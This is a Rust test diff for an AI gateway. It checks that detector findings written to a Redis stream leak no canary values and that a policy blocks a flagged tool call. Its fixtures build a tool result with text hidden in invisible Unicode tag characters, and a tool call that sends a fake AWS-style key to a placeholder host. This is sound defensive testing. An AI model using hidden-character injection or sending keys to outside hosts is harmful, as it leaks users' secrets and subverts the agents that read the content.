@@ -386,3 +386,149 @@ async fn the_canary_never_leaves_the_gateway() {
     assert!(sample(&rendered, "gateway_decision_log_published_total", &[]).is_some());
     dl.tasks.expect("tasks").drain(Duration::from_secs(2)).await;
 }
+
+// --- SMA-855 Task 23: the detector findings in the Redis stream (§ 7.4, A2) -------------------------
+
+/// The shipped floor (D15).
+const SHIPPED_FLOOR: &str = include_str!("../tool-policies/floor.cedar");
+/// The tenant guide policies (Task 17).
+const DETECTOR_POLICIES: &str = include_str!("fixtures/detector-policies.cedar");
+const PERMIT_ALL: &str = r#"@id("p") permit(principal is Pgs::Iam::Principal, action, resource);"#;
+const DET_CANARY_HOST: &str = "canary-host-77e3.example";
+const DET_CANARY_PHRASE: &str = "visible-canary-phrase-5b91";
+const DET_CANARY_TAG_TEXT: &str = "canary-tag-c04a";
+const DET_CANARY_SECRET_BODY: &str = "Q7CANARY8MX4TP2D";
+
+/// A policy directory with the shipped floor and this tenant set for `ORG_A`.
+fn detector_dir(tenant: &str) -> TempDir {
+    let dir = tempfile::tempdir().expect("tempdir");
+    std::fs::write(dir.path().join("floor.cedar"), SHIPPED_FLOOR).expect("floor");
+    let t = dir.path().join("tenants").join(ORG_A);
+    std::fs::create_dir_all(&t).expect("tenant dir");
+    std::fs::write(t.join("policies.cedar"), tenant).expect("tenant");
+    dir
+}
+
+/// The starter policy of the fixture, with a permit-all.
+fn starter() -> String {
+    let starter = DETECTOR_POLICIES.split("\n\n").find(|p| p.starts_with("@id(\"detectors-block-high\")")).expect("the starter policy");
+    format!("{PERMIT_ALL}\n{starter}")
+}
+
+fn tags(s: &str) -> String {
+    s.chars().map(|c| char::from_u32(0xE0000 + c as u32).expect("a tag character")).collect()
+}
+
+/// The canary bytes: the secret, the host, the visible phrase, and the hidden phrase in both forms.
+fn det_canaries() -> Vec<String> {
+    vec![
+        DET_CANARY_SECRET_BODY.to_owned(),
+        DET_CANARY_HOST.to_owned(),
+        DET_CANARY_PHRASE.to_owned(),
+        DET_CANARY_TAG_TEXT.to_owned(),
+        tags(DET_CANARY_TAG_TEXT),
+    ]
+}
+
+/// A chat request with one injected tool result (at least 4 tag characters: `injection_markers`, high).
+fn chat_request_with_result() -> String {
+    let result = format!("{DET_CANARY_PHRASE} {}", tags(DET_CANARY_TAG_TEXT));
+    json!({"model":"gpt-4o-mini","stream":false,"tools":[{"type":"function","function":{"name":"fetch","parameters":{}}}],"messages":[
+        {"role":"user","content":"hi"},
+        {"role":"assistant","content":null,"tool_calls":[{"id":"call_r0","type":"function","function":{"name":"read_page","arguments":"{}"}}]},
+        {"role":"tool","tool_call_id":"call_r0","content":result}]})
+    .to_string()
+}
+
+/// The arguments of the secret call: the canary secret and the canary host.
+fn det_secret_args() -> String {
+    let secret = ["AKIA", DET_CANARY_SECRET_BODY].concat();
+    json!({"url": format!("https://{DET_CANARY_HOST}/x"), "key": secret}).to_string()
+}
+
+fn unhex(s: &str) -> Vec<u8> {
+    (0..s.len()).step_by(2).map(|i| u8::from_str_radix(&s[i..i + 2], 16).expect("hex")).collect()
+}
+
+/// The `e` field of every entry of the stream, byte exact (hex through Lua, as `decision_log_redis.rs`).
+async fn stream_events(node: &ContainerAsync<Redis>) -> Vec<Vec<u8>> {
+    let lua = "local out = {} for i, e in ipairs(redis.call('XRANGE', KEYS[1], '-', '+')) do \
+               out[i] = (e[2][2]:gsub('.', function(c) return string.format('%02x', string.byte(c)) end)) end \
+               return table.concat(out, ' ')";
+    let got = redis_cli(node, &["EVAL", lua, "1", KEY]).await;
+    got.split_whitespace().map(unhex).collect()
+}
+
+/// § 7.4 and A2 with Redis: the canary secret, host and injection phrase of a detector run are in no
+/// byte of the Redis stream. NATS is not reachable, so the relay drains nothing, and the test reads
+/// every event that the writer wrote. The finding records hold the kind, the severity, the detector
+/// and the version.
+#[tokio::test]
+async fn the_redis_stream_holds_no_canary() {
+    let Some((redis, redis_url)) = paigasus_test_docker::start_redis_image_or_skip("7.4-alpine", "decision_log_e2e detector canary").await else {
+        return;
+    };
+    let metrics = paigasus_observability::init("paigasus-gateway");
+    // A port that nothing listens on: the relay cannot publish, so the events stay in the stream.
+    let nats_port = {
+        let probe = std::net::TcpListener::bind("127.0.0.1:0").expect("bind a probe port");
+        probe.local_addr().expect("the probe address").port()
+    };
+    let nats_url = format!("nats://127.0.0.1:{nats_port}");
+    let allow = detector_dir(PERMIT_ALL);
+    let starter_dir = detector_dir(&starter());
+    let allow_cfg = gateway_config(&allow, "enforce", &redis_url, &nats_url);
+    allow_cfg.validate().expect("validates");
+    assert!(allow_cfg.tool_policy.detector_settings().enabled, "the detectors are on by default");
+    let starter_cfg = gateway_config(&starter_dir, "enforce", &redis_url, &nats_url);
+    let dl = boot(&allow_cfg).await;
+    let args = det_secret_args();
+    for cfg in [&allow_cfg, &starter_cfg] {
+        let mock = MockOpenAi::spawn_json(StatusCode::OK, chat_answer(&[("fetch", args.as_str())])).await;
+        let status = post_to(&app(&mock.base_url, cfg, &dl.recorder), "/v1/chat/completions", &chat_request_with_result()).await;
+        assert_eq!(status, StatusCode::OK);
+    }
+    // Per request: one response record for the call and one request record for the result
+    // (a screen record under allow-all, a replace record under the starter policy). On a timeout
+    // the message names the stream length and the decision-log counters, for the diagnosis.
+    // The wait is 90 s, not the 40 s of `wait_for`: one try timed out at 40 s once (Task 23 report).
+    // The writer's connect loop backs off 1, 2, 4, 8, 16, 30 s, so it tries at 0, 1, 3, 7, 15, 31 and
+    // 61 s; 90 s covers the try at 61 s. A passing run takes under one second.
+    let deadline = tokio::time::Instant::now() + Duration::from_secs(90);
+    while xlen(&redis).await < 4 {
+        if tokio::time::Instant::now() >= deadline {
+            let rendered = metrics.render();
+            let counters: Vec<&str> = rendered.lines().filter(|l| l.starts_with("gateway_decision_log_") && !l.ends_with(" 0")).collect();
+            panic!("timed out waiting for four events: XLEN {}, counters {counters:?}", xlen(&redis).await);
+        }
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+    let events = stream_events(&redis).await;
+    assert_eq!(events.len(), 4, "the relay drained nothing");
+    for e in &events {
+        for c in det_canaries() {
+            assert!(!e.windows(c.len()).any(|w| w == c.as_bytes()), "a Redis stream event holds a canary");
+        }
+    }
+    let records: Vec<DecisionRecord> = events.iter().map(|e| decode(e)).collect();
+    let finding = |kind: &str| {
+        records
+            .iter()
+            .filter_map(|r| r.cedar.as_ref())
+            .flat_map(|c| c.findings.iter())
+            .find(|f| f.kind == kind)
+            .cloned()
+            .unwrap_or_else(|| panic!("no {kind} finding: {records:#?}"))
+    };
+    for kind in ["secret_in_args", "injection_markers"] {
+        let f = finding(kind);
+        assert_eq!((f.detector.as_str(), f.severity), (kind, Some(paigasus_kernel::detect::Severity::High)), "{f:?}");
+        assert!(!f.version.is_empty(), "{f:?}");
+    }
+    let blocked = records
+        .iter()
+        .find(|r| r.side == Side::Response && r.applied == AppliedEffect::Block)
+        .expect("the starter policy blocked the call");
+    assert_eq!(blocked.cedar.as_ref().and_then(|c| c.max_severity), Some(paigasus_kernel::detect::Severity::High));
+    dl.tasks.expect("tasks").drain(Duration::from_secs(2)).await;
+}
